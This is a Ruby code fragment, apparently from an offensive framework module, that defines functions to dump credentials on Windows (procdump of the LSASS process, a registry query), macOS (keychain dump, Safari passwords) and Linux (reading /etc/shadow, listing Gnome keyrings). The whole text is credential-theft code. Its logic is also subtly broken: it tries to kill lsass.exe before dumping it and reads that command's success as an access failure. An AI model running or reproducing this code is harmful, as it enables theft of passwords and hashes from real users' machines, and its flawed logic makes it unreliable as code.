    def dump_windows_creds
      creds = {}
      temp_file = "#{Dir.tmpdir}/lsass_#{SecureRandom.hex(4)}.dmp"
      
      # Dump LSASS process
      if system("taskkill /f /im lsass.exe")
        @framework.print_error("Cannot dump LSASS - access denied")
        return {}
      end
      
      if system("procdump.exe -accepteula -ma lsass.exe #{temp_file}")
        # Parse LSASS dump (simplified)
        creds[:lsass] = File.exist?(temp_file) ? 'LSASS dump successful' : 'LSASS dump failed'
        File.delete(temp_file) rescue nil
      else
        @framework.print_error("Procdump not available")
      end
      
      # Registry credentials
      begin
        reg_keys = `reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /s`
        creds[:registry] = reg_keys.scan(/REG_SZ\s+(.+)/).flatten
      rescue
        creds[:registry] = []
      end
      
      creds
    end

    def dump_macos_creds
      creds = {}
      
      # Keychain extraction
      keychains = Dir["#{ENV['HOME']}/Library/Keychains/*.keychain-db"]
      creds[:keychains] = keychains.map do |kc|
        `security dump-keychain -d #{kc}`
      end
      
      # Safari passwords
      if File.exist?("#{ENV['HOME']}/Library/Safari/Passwords.plist")
        creds[:safari] = `plutil -convert xml1 -o - ~/Library/Safari/Passwords.plist`
      end
      
      creds
    end

    def dump_linux_creds
      creds = {}
      
      # /etc/shadow extraction
      if File.exist?('/etc/shadow') && Process.uid == 0
        creds[:shadow] = File.read('/etc/shadow')
      end
      
      # Gnome keyring
      if Dir.exist?("#{ENV['HOME']}/.local/share/keyrings")
        creds[:keyrings] = Dir["#{ENV['HOME']}/.local/share/keyrings/*"]
      end
      
      creds
    end

